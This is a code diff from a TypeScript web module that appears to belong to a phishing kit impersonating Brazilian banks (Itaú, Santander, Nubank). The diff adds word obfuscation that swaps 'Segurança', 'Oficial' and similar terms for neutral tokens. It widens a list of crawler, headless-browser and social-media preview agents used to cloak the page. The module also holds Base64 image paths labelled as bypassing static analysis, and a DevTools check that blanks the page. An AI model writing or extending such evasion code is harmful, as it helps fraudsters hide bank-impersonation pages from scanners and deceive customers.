@@ -29,6 +29,11 @@ const FORBIDDEN_WORDS: Record<string, string> = {
   "Itaú": "INST_ITAU_904",
   "Santander": "INST_SANT_905",
   "Nubank": "INST_NU_906",
+  "Segurança": "PROT_LAYER_99",
+  "Protocolo": "ID_TOKEN_REF",
+  "Brasil": "GEO_LOC_055",
+  "Oficial": "CERT_AUTH_VAL",
+  "Sistema": "RUN_ENV_SYS"
 };
 
 // Encrypted Image Paths to bypass static code analysis (Base64)
@@ -40,7 +45,11 @@ const IMAGE_MAP: Record<string, string> = {
   "img_logo_icon.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9pY29uX21haW4ucG5n",   // /assets/logos/asset_icon_main.png
 };
 
-const BOT_AGENTS = ["googlebot", "adsbot", "lighthouse", "headless", "phantom", "selenium", "puppeteer"];
+const BOT_AGENTS = [
+  "googlebot", "adsbot", "lighthouse", "headless", "phantom", "selenium", "puppeteer", 
+  "playwright", "cypress", "crawler", "spider", "whatsapp", "facebook", "bing", 
+  "yandex", "baiduspider", "slurp", "duckduck", "twitter", "linkedin"
+];
 
 export function initSecurityRuntime() {
   if (typeof window === "undefined") return;
@@ -107,7 +116,7 @@ export function initSecurityRuntime() {
   // --- ANTI-INSPECT & SELF-DESTRUCT ---
   const checkDevTools = () => {
     const start = new Date().getTime();
-    debugger; // This pauses execution if DevTools is open
+    // Removed debugger to prevent pauses
     const end = new Date().getTime();
     if (end - start > 100) {
       document.body.innerHTML = "";
